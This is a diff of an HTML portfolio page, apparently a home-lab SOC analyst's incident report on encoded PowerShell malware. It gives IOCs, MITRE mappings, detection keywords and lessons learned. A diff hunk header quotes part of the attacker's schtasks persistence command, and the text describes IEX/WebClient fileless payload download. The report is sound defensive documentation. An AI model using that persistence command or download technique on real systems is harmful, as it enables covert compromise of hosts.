+    <p style="font-size:0.84rem;color:var(--text-l);line-height:1.7;margin-bottom:1rem;">All IOCs below have been sanitized for public sharing — the C2 domain is defanged. None of these appeared in any threat feed prior to the incident; the IP and domain were freshly deployed infrastructure, which is part of why catching the behavioral indicators (the encoded command, the network callback, the scheduled task) was more important than signature matching.</p>
     <div style="overflow-x:auto;">
       <table class="ioc-table">
         <thead>
-          <tr><th>Type</th><th>Value</th><th>Context</th></tr>
+          <tr><th>Type</th><th>Value</th><th>Context</th><th>Confidence</th></tr>
         </thead>
         <tbody>
-          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">IP</span></td><td>185.220.101.42</td><td>C2 server — 100/100 AbuseIPDB, 8/92 VT flags</td></tr>
-          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">DOMAIN</span></td><td>malicious[.]com</td><td>Stage-2 payload host — 3 days old at time of incident</td></tr>
-          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">FILE</span></td><td>C:\Users\Public\update.ps1</td><td>Dropped stage-2 payload script</td></tr>
-          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">PROCESS</span></td><td>powershell.exe (PID 4892)</td><td>Malicious execution — parent cmd.exe</td></tr>
-          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">TASK</span></td><td>SystemUpdate</td><td>Persistence — triggers on user logon</td></tr>
-          <tr><td><span class="tag" style="font-size:0.62rem;">HASH</span></td><td>SQBFAFgAIAAo... (B64)</td><td>Encoded command payload</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">IP</span></td><td>185.220.101.42</td><td>C2 server — HTTP outbound detected by Suricata at T+0:00</td><td style="color:#f87171;">High</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">DOMAIN</span></td><td>malicious[.]com</td><td>Stage-2 payload host — 3 days old at time of incident</td><td style="color:#f87171;">High</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">FILE</span></td><td>C:\Users\Public\update.ps1</td><td>Dropped stage-2 payload — written to disk by download chain</td><td style="color:#f87171;">High</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">PROCESS</span></td><td>powershell.exe (PID 4892)</td><td>Malicious execution — parent cmd.exe, full encoded CLI captured</td><td style="color:#f87171;">High</td></tr>
+          <tr><td><span class="tag tag-red" style="font-size:0.62rem;">TASK</span></td><td>"SystemUpdate"</td><td>Persistence — /sc onlogon, triggers on every user logon</td><td style="color:#f87171;">High</td></tr>
+          <tr><td><span class="tag" style="font-size:0.62rem;">CMDLINE</span></td><td>-EncodedCommand SQBFAFgA...</td><td>Base64-encoded payload — UTF-16LE decode confirms malicious intent</td><td style="color:#fde68a;">Medium</td></tr>
+          <tr><td><span class="tag" style="font-size:0.62rem;">PORT</span></td><td>TCP/80 outbound</td><td>C2 callback over HTTP — Suricata alert 2013028 ET TROJAN</td><td style="color:#fde68a;">Medium</td></tr>
         </tbody>
       </table>
     </div>
   </div>
 
+  <!-- MITRE -->
   <div class="glass">
     <div class="s-title"><span class="s-num">05.</span> MITRE ATT&amp;CK Mapping</div>
+    <p style="font-size:0.84rem;color:var(--text-l);line-height:1.7;margin-bottom:1rem;">This attack followed a recognizable pattern — one that shows up constantly in commodity malware because it works. Four techniques in sequence: execute via PowerShell, hide the command with encoding, pull down the next stage over the network, then dig in with persistence. Understanding each step in MITRE terms is useful because it tells you exactly where in the kill chain detection was possible and where it wasn't.</p>
     <div class="mitre-grid">
       <div class="mitre-card">
         <div class="mitre-id">T1059.001</div>
         <div class="mitre-name">PowerShell</div>
         <div class="mitre-tactic">Tactic: Execution</div>
-        <div class="mitre-desc">Attacker used PowerShell to execute an encoded command, leveraging IEX + WebClient for fileless in-memory payload delivery.</div>
+        <div class="mitre-desc">Attacker used PowerShell with IEX + WebClient to execute a remote payload entirely in memory. The fileless approach means nothing is written to disk during initial execution — traditional file-based AV misses it. Detection required process event logging (Sysmon) at the host level.</div>
       </div>
       <div class="mitre-card">
         <div class="mitre-id">T1027</div>
-        <div class="mitre-name">Obfuscated Files</div>
+        <div class="mitre-name">Obfuscated Files / Info</div>
         <div class="mitre-tactic">Tactic: Defense Evasion</div>
-        <div class="mitre-desc">Base64 encoding used to hide the malicious command content from string-based detection rules and casual log inspection.</div>
+        <div class="mitre-desc">Base64 encoding hid the malicious content from string-based detection. Any rule looking for <code style="font-family:'Fira Code',monospace;font-size:0.85em;">IEX</code>, <code style="font-family:'Fira Code',monospace;font-size:0.85em;">DownloadString</code>, or <code style="font-family:'Fira Code',monospace;font-size:0.85em;">schtasks</code> in plain text would have fired only after decoding. Wazuh Rule 91816 detects the <em>pattern</em> of encoded command execution rather than the decoded content — which is why it still fired.</div>
       </div>
       <div class="mitre-card">
         <div class="mitre-id">T1053.005</div>
         <div class="mitre-name">Scheduled Task</div>
         <div class="mitre-tactic">Tactic: Persistence</div>
-        <div class="mitre-desc">"SystemUpdate" scheduled task created to re-execute the malicious PowerShell script on every user logon, surviving reboots.</div>
+        <div class="mitre-desc">"SystemUpdate" task created with <code style="font-family:'Fira Code',monospace;font-size:0.85em;">/sc onlogon</code> — meaning it runs every time any user logs in. A named task like "SystemUpdate" blends into the list of legitimate Windows tasks, making it easy to miss if you're just scanning the task list without knowing what to look for. Windows Event ID 4698 is the detection point.</div>
       </div>
       <div class="mitre-card">
         <div class="mitre-id">T1105</div>
         <div class="mitre-name">Ingress Tool Transfer</div>
         <div class="mitre-tactic">Tactic: Command &amp; Control</div>
-        <div class="mitre-desc">HTTP GET to 185.220.101.42 attempted to download stage-2 payload (stage2.ps1) from attacker-controlled infrastructure.</div>
+        <div class="mitre-desc">HTTP GET to 185.220.101.42 to pull stage2.ps1 from attacker infrastructure. Suricata caught this at the network layer before the payload could be executed. This is the one part of the attack where network-based detection had an advantage over host-based — the outbound connection is visible at the wire, not just on the endpoint.</div>
       </div>
     </div>
   </div>
 
+  <!-- LESSONS LEARNED -->
   <div class="glass">
-    <div class="s-title"><span class="s-num">06.</span> Lessons Learned</div>
+    <div class="s-title"><span class="s-num">06.</span> Lessons Learned — What Actually Happened</div>
+    <p style="font-size:0.84rem;color:var(--text-l);line-height:1.7;margin-bottom:1.25rem;">I want to be specific here rather than give a cleaned-up list of takeaways. A "lessons learned" section that only says what worked is useless. Here's the honest version.</p>
+
     <div class="alert-box alert-success mb-4">
-      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">WHAT WORKED</div>
+      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:10px;opacity:0.7;">WHAT WORKED</div>
       <ul class="bullet-list" style="color:#86efac;">
-        <li>Wazuh detected the encoded command within seconds of execution</li>
-        <li>Multi-source log correlation (HIDS + IDS + Windows events) built the full attack chain</li>
-        <li>Automated threat intelligence via CyberOps Sidekick added context in under 30 seconds</li>
-        <li>Forensic evidence collected before containment — proper chain of custody</li>
+        <li><strong>Wazuh Rule 91816 fired immediately.</strong> I'd tuned this rule specifically while studying for CySA+ — reading about PowerShell obfuscation techniques and then going back to add detection for encoded command patterns. Seeing it fire on something real was the first time the loop between studying and doing closed for me.</li>
+        <li><strong>Three-source correlation built the full picture.</strong> Wazuh had the host behavior. Suricata had the network callback. Windows event logs had the persistence mechanism. No single source told the complete story — that's not a weakness, that's how layered defense is supposed to work.</li>
+        <li><strong>Threat intel enrichment was fast.</strong> CyberOps Sidekick returned the AbuseIPDB + VirusTotal + OTX consolidated report in about 30 seconds. That's 10+ minutes of manual lookups automated. In a real SOC with dozens of alerts per shift, that delta matters enormously.</li>
+        <li><strong>Sysmon captured everything I needed at the host level.</strong> Without Sysmon's full command line logging, Event ID 4688 alone would have shown <code style="font-family:'Fira Code',monospace;font-size:0.85em;">powershell.exe</code> launched but not the encoded payload. The difference between those two pieces of information is the difference between a suspicious event and a confirmed malicious one.</li>
       </ul>
     </div>
+
     <div class="alert-box alert-warning mb-4">
-      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">GAPS IDENTIFIED</div>
+      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:10px;opacity:0.7;">GAPS — THE HONEST ONES</div>
       <ul class="bullet-list" style="color:#fde68a;">
-        <li>Base64 decoding was done manually — 5-minute delay that should be automated</li>
-        <li>No pre-built response playbook: isolation steps were recalled from memory</li>
-        <li>Manual network isolation took 15+ minutes — SOAR integration would cut this to seconds</li>
+        <li><strong>The Base64 decode took 5 minutes and required a manual tool switch.</strong> UTF-8 failed, I had to realize the encoding was UTF-16LE and redo it. That's not a catastrophic failure but it's 5 minutes of cognitive load on a step that should be one click. I've since added a Splunk search-time command that auto-decodes encoded PowerShell commands and appends the plaintext to the alert.</li>
+        <li><strong>No written incident response playbook existed.</strong> I worked from memory — I knew what to do, but the process wasn't documented. If I'd been on-call for someone else's environment, or if this had happened at 3am when I was half-asleep, the lack of a written procedure would have cost time. I wrote the playbook the following day. It's two pages.</li>
+        <li><strong>The forensic collection ordering was wrong.</strong> I isolated before finishing artifact collection because I was worried about re-infection via the scheduled task. The right call was to block only the C2 IP while collecting remaining artifacts, then do full isolation. Nothing was lost this time, but the procedure was incorrect.</li>
+        <li><strong>15-minute window between network isolation and task removal.</strong> In that 15 minutes, a reboot would have re-triggered the scheduled task and re-run the malicious script — which would have failed to reach C2 (since I'd blocked egress) but would still have attempted to execute. In a production environment that's an acceptable-but-uncomfortable window. SOAR-assisted containment would close this to under a minute.</li>
       </ul>
     </div>
+
     <div class="alert-box alert-success">
-      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:8px;opacity:0.7;">IMPROVEMENTS IMPLEMENTED</div>
+      <div style="font-family:'Fira Code',monospace;font-size:0.68rem;letter-spacing:0.08em;margin-bottom:10px;opacity:0.7;">IMPROVEMENTS IMPLEMENTED AFTER</div>
       <ul class="bullet-list" style="color:#86efac;">
-        <li>Splunk alert now auto-decodes Base64 PowerShell commands and appends decoded content to alert</li>
-        <li>Custom Suricata rule written to flag PowerShell <code style="font-family:'Fira Code',monospace;font-size:0.85em;">-EncodedCommand</code> patterns at network layer</li>
-        <li>Incident response playbook documented for encoded PowerShell class of alerts</li>
-        <li>Threat intel enrichment integrated directly into Splunk alert workflow</li>
+        <li>Splunk alert search now auto-decodes Base64 PowerShell commands via <code style="font-family:'Fira Code',monospace;font-size:0.85em;">eval decoded=base64decode(...)</code> and appends plaintext to the alert notification</li>
+        <li>Custom Suricata rule written to flag <code style="font-family:'Fira Code',monospace;font-size:0.85em;">-EncodedCommand</code> patterns at the network layer as an additional detection signal</li>
+        <li>Written IR playbook for encoded PowerShell class of alerts — two pages, covers triage, correlation, enrichment, containment, forensics, and documentation in order</li>
+        <li>Forensic collection checklist added to playbook with explicit ordering: collect first, isolate second</li>
+        <li>Threat intel enrichment wired directly into Splunk alert workflow via webhook so enrichment starts the moment the alert fires, not when I manually run the bot</li>
       </ul>
     </div>
   </div>
 
+  <!-- CONCLUSION -->
   <div class="glass">
     <div class="s-title"><span class="s-num">07.</span> Conclusion</div>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">Context is everything in SOC work. The initial Wazuh alert was a single line in the logs. By correlating data across three independent sources — HIDS, network IDS, and Windows event logs — and enriching with external threat intelligence, I was able to reconstruct the complete attack chain: initial execution → obfuscation → C2 callback attempt → persistence establishment.</p>
-    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;">Detection to containment in 42 minutes on a solo analyst workflow. The gaps identified (manual decoding, no playbook, slow isolation) are exactly the kind of friction that SOAR tooling is designed to eliminate. This investigation directly informed automation improvements to the lab pipeline.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">I've been asked a few times whether a home lab actually teaches you anything that transfers to a real SOC environment, or whether it's just a way to fill a resume line. This incident is my answer to that question.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">The analysis I ran here — decoding an obfuscated payload, correlating three independent data sources to build an attack chain, enriching IOCs against external threat intelligence, working through host forensics before containment — that's the actual job. Not a simplified version of it, not a tutorial with training wheels. The 42-minute timeline is real. The gaps I found are real. The improvements I implemented afterward are running right now.</p>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;margin-bottom:1rem;">What a home lab doesn't give you is scale. I'm handling around 10,000 events per day; an enterprise SOC might be handling tens of millions. But the analytical process is identical — alert fires, you triage, you correlate, you enrich, you contain. The tooling helps with volume. The thinking doesn't change.</p>
+    <div class="pull-quote">
+      <p>"Context is everything in this work. The initial alert was one line in Splunk. What turned it into a complete attack chain was the correlation — three sources saying three different things, all pointing at the same 2-second window on the same host."</p>
+    </div>
+    <p style="font-size:0.88rem;color:var(--text-l);line-height:1.85;">And the thing is, every analyst starts somewhere. This lab is my somewhere. The mistakes I made here — the forensic ordering error, the missing playbook, the manual decode — I'd rather find those gaps now, in a controlled environment where the consequences are a lesson, not a breach.</p>
   </div>
 
+  <!-- SKILLS -->
   <div class="glass">
     <div class="s-title"><span class="s-num">08.</span> Skills Demonstrated</div>
     <div style="display:flex;flex-wrap:wrap;gap:0.5rem;">
@@ -504,14 +590,18 @@ schtasks /create /tn "SystemUpdate" /tr "powershell -File C:\Users\Public\update
       <span class="tag">Wazuh HIDS</span>
       <span class="tag">Suricata IDS</span>
       <span class="tag">Sysmon</span>
+      <span class="tag">Windows Event Logs</span>
       <span class="tag">Host Forensics</span>
       <span class="tag">Incident Containment</span>
-      <span class="tag">Documentation</span>
+      <span class="tag">IOC Documentation</span>
+      <span class="tag">Fileless Attack Analysis</span>
+      <span class="tag">Process Analysis</span>
     </div>
   </div>
 
   <div style="text-align:center;margin-top:2.5rem;">
-    <a href="../index.html#projects" class="btn-outline">← Back to Projects</a>
+    <a href="piSOC.html" class="btn-outline" style="margin-right:1rem;">← Mini-SOC Overview</a>
+    <a href="../index.html#projects" class="btn-outline">← All Projects</a>
   </div>
 
 </main>
@@ -560,7 +650,7 @@ document.addEventListener('mousemove', (e) => { mx = e.clientX; my = e.clientY; 
   ring.style.left = rx + 'px'; ring.style.top = ry + 'px';
   requestAnimationFrame(animCursor);
 })();
-document.querySelectorAll('a,button,.metric-card,.mitre-card,.tl-card').forEach(el => {
+document.querySelectorAll('a,button,.metric-card,.mitre-card,.tl-card,.env-card').forEach(el => {
   el.addEventListener('mouseenter', () => {
     dot.style.transform = 'translate(-50%,-50%) scale(2.5)';
     ring.style.width = '56px'; ring.style.height = '56px';
@@ -626,16 +716,11 @@ gsap.to('.hero-inner', {
   scrollTrigger: { trigger: '#hero', start: '45% top', end: 'bottom top', scrub: 1 }
 });
 
-// ============================================================
 // HORIZONTAL TIMELINE
-// ============================================================
 const tlTrack = document.getElementById('tl-track');
 const tlPin = document.getElementById('tl-pin-section');
 const tlProg = document.getElementById('tl-prog');
 const threatCard = document.getElementById('tl-card-0');
-
-// Make sure we calculate after render
-ScrollTrigger.addEventListener('refresh', () => {});
 
 const tlAnim = gsap.to(tlTrack, {
   x: () => -(tlTrack.scrollWidth - window.innerWidth),
@@ -649,7 +734,6 @@ const tlAnim = gsap.to(tlTrack, {
     invalidateOnRefresh: true,
     onUpdate: (self) => {
       tlProg.style.width = (self.progress * 100) + '%';
-      // Activate red pulse when threat card is prominent (first 30% of scroll)
       if (self.progress < 0.3) {
         threatCard.classList.add('active');
       } else {
@@ -671,7 +755,7 @@ gsap.utils.toArray('.glass').forEach(el => {
     scrollTrigger: { trigger: el, start: 'top 90%', once: true }
   });
 });
-gsap.utils.toArray('.mitre-card').forEach((card, i) => {
+gsap.utils.toArray('.mitre-card').forEach(card => {
   gsap.from(card, {
     y: 20, opacity: 0, duration: 0.6, ease: 'power3.out',
     scrollTrigger: { trigger: card, start: 'top 92%', once: true }
@@ -681,6 +765,12 @@ gsap.utils.toArray('.tl-item').forEach(item => {
   gsap.from(item, {
     x: -18, opacity: 0, duration: 0.65, ease: 'power3.out',
     scrollTrigger: { trigger: item, start: 'top 91%', once: true }
+  });
+});
+gsap.utils.toArray('.env-card').forEach((card, i) => {
+  gsap.from(card, {
+    y: 16, opacity: 0, duration: 0.5, ease: 'power3.out', delay: i * 0.08,
+    scrollTrigger: { trigger: card, start: 'top 93%', once: true }
   });
 });
 
